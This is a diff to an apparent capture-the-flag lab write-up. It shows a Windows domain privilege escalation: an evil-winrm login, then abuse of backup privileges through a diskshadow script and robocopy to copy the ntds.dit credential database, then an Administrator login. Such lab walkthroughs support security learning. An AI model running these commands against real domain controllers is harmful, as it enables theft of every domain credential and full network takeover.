@@ -114,6 +114,362 @@ New SMB password:
 Retype new SMB password:
 Password changed for user Caroline.Robinson
 
-I used NewPassword123, you can use anything you like.
+I used NewPassword123, you can use anything you like. Now login using evilwin-rm:
+evil-winrm -i 10.129.4.157 -u Caroline.Robinson
+Enter Password: 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 
+
+While enumerating privileges, we can see that we can make backups:
+<img width="669" height="240" alt="image" src="https://github.com/user-attachments/assets/ece52a6b-f956-4e10-a4ab-e245132974bf" />
+
+Execute the following commands:
+<img width="565" height="484" alt="image" src="https://github.com/user-attachments/assets/11cb058c-2085-4b27-8a78-20740ae92423" />
+
+Then run impacket
+<img width="762" height="375" alt="image" src="https://github.com/user-attachments/assets/6f23a9e3-2f9b-4cca-9e83-8c7d82c6c6b5" />
+
+GO back and run the following commands;
+*Evil-WinRM* PS C:\Temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
+*Evil-WinRM* PS C:\Temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
+*Evil-WinRM* PS C:\Temp> echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
+*Evil-WinRM* PS C:\Temp> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
+
+Then:
+<img width="1233" height="517" alt="image" src="https://github.com/user-attachments/assets/6d77dcb1-c1bf-4bec-a339-1bd1e20da8c2" />
+
+*Evil-WinRM* PS C:\Temp> robocopy /b Z:\Windows\ntds . ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Thursday, May 28, 2026 5:03:13 PM
+   Source : Z:\Windows\ntds\
+     Dest : C:\Temp\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           1    Z:\Windows\ntds\
+            New File              16.0 m        ntds.dit
+  0.0%
+  0.3%
+  0.7%
+  1.1%
+  1.5%
+  1.9%
+  2.3%
+  2.7%
+  3.1%
+  3.5%
+  3.9%
+  4.2%
+  4.6%
+  5.0%
+  5.4%
+  5.8%
+  6.2%
+  6.6%
+  7.0%
+  7.4%
+  7.8%
+  8.2%
+  8.5%
+  8.9%
+  9.3%
+  9.7%
+ 10.1%
+ 10.5%
+ 10.9%
+ 11.3%
+ 11.7%
+ 12.1%
+ 12.5%
+ 12.8%
+ 13.2%
+ 13.6%
+ 14.0%
+ 14.4%
+ 14.8%
+ 15.2%
+ 15.6%
+ 16.0%
+ 16.4%
+ 16.7%
+ 17.1%
+ 17.5%
+ 17.9%
+ 18.3%
+ 18.7%
+ 19.1%
+ 19.5%
+ 19.9%
+ 20.3%
+ 20.7%
+ 21.0%
+ 21.4%
+ 21.8%
+ 22.2%
+ 22.6%
+ 23.0%
+ 23.4%
+ 23.8%
+ 24.2%
+ 24.6%
+ 25.0%
+ 25.3%
+ 25.7%
+ 26.1%
+ 26.5%
+ 26.9%
+ 27.3%
+ 27.7%
+ 28.1%
+ 28.5%
+ 28.9%
+ 29.2%
+ 29.6%
+ 30.0%
+ 30.4%
+ 30.8%
+ 31.2%
+ 31.6%
+ 32.0%
+ 32.4%
+ 32.8%
+ 33.2%
+ 33.5%
+ 33.9%
+ 34.3%
+ 34.7%
+ 35.1%
+ 35.5%
+ 35.9%
+ 36.3%
+ 36.7%
+ 37.1%
+ 37.5%
+ 37.8%
+ 38.2%
+ 38.6%
+ 39.0%
+ 39.4%
+ 39.8%
+ 40.2%
+ 40.6%
+ 41.0%
+ 41.4%
+ 41.7%
+ 42.1%
+ 42.5%
+ 42.9%
+ 43.3%
+ 43.7%
+ 44.1%
+ 44.5%
+ 44.9%
+ 45.3%
+ 45.7%
+ 46.0%
+ 46.4%
+ 46.8%
+ 47.2%
+ 47.6%
+ 48.0%
+ 48.4%
+ 48.8%
+ 49.2%
+ 49.6%
+ 50.0%
+ 50.3%
+ 50.7%
+ 51.1%
+ 51.5%
+ 51.9%
+ 52.3%
+ 52.7%
+ 53.1%
+ 53.5%
+ 53.9%
+ 54.2%
+ 54.6%
+ 55.0%
+ 55.4%
+ 55.8%
+ 56.2%
+ 56.6%
+ 57.0%
+ 57.4%
+ 57.8%
+ 58.2%
+ 58.5%
+ 58.9%
+ 59.3%
+ 59.7%
+ 60.1%
+ 60.5%
+ 60.9%
+ 61.3%
+ 61.7%
+ 62.1%
+ 62.5%
+ 62.8%
+ 63.2%
+ 63.6%
+ 64.0%
+ 64.4%
+ 64.8%
+ 65.2%
+ 65.6%
+ 66.0%
+ 66.4%
+ 66.7%
+ 67.1%
+ 67.5%
+ 67.9%
+ 68.3%
+ 68.7%
+ 69.1%
+ 69.5%
+ 69.9%
+ 70.3%
+ 70.7%
+ 71.0%
+ 71.4%
+ 71.8%
+ 72.2%
+ 72.6%
+ 73.0%
+ 73.4%
+ 73.8%
+ 74.2%
+ 74.6%
+ 75.0%
+ 75.3%
+ 75.7%
+ 76.1%
+ 76.5%
+ 76.9%
+ 77.3%
+ 77.7%
+ 78.1%
+ 78.5%
+ 78.9%
+ 79.2%
+ 79.6%
+ 80.0%
+ 80.4%
+ 80.8%
+ 81.2%
+ 81.6%
+ 82.0%
+ 82.4%
+ 82.8%
+ 83.2%
+ 83.5%
+ 83.9%
+ 84.3%
+ 84.7%
+ 85.1%
+ 85.5%
+ 85.9%
+ 86.3%
+ 86.7%
+ 87.1%
+ 87.5%
+ 87.8%
+ 88.2%
+ 88.6%
+ 89.0%
+ 89.4%
+ 89.8%
+ 90.2%
+ 90.6%
+ 91.0%
+ 91.4%
+ 91.7%
+ 92.1%
+ 92.5%
+ 92.9%
+ 93.3%
+ 93.7%
+ 94.1%
+ 94.5%
+ 94.9%
+ 95.3%
+ 95.7%
+ 96.0%
+ 96.4%
+ 96.8%
+ 97.2%
+ 97.6%
+ 98.0%
+ 98.4%
+ 98.8%
+ 99.2%
+ 99.6%
+100%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           118,987,347 Bytes/sec.
+   Speed :             6,808.511 MegaBytes/min.
+   Ended : Thursday, May 28, 2026 5:03:14 PM
+
+*Evil-WinRM* PS C:\Temp> robocopy /b Z:\Windows\ntds . ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Thursday, May 28, 2026 5:04:16 PM
+   Source : Z:\Windows\ntds\
+     Dest : C:\Temp\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           1    Z:\Windows\ntds\
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         0         1         0         0         0
+   Bytes :   16.00 m         0   16.00 m         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+   Ended : Thursday, May 28, 2026 5:04:16 PM
+
+Log into Administrator:
+<img width="671" height="386" alt="image" src="https://github.com/user-attachments/assets/a79f8616-eaf2-42a9-a40c-f30971de3dc1" />
+
+
+<img width="625" height="231" alt="image" src="https://github.com/user-attachments/assets/033cc28f-cd6d-4562-8320-6d4a9e0d8e04" />
+
+
+
+
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 85.86 seconds
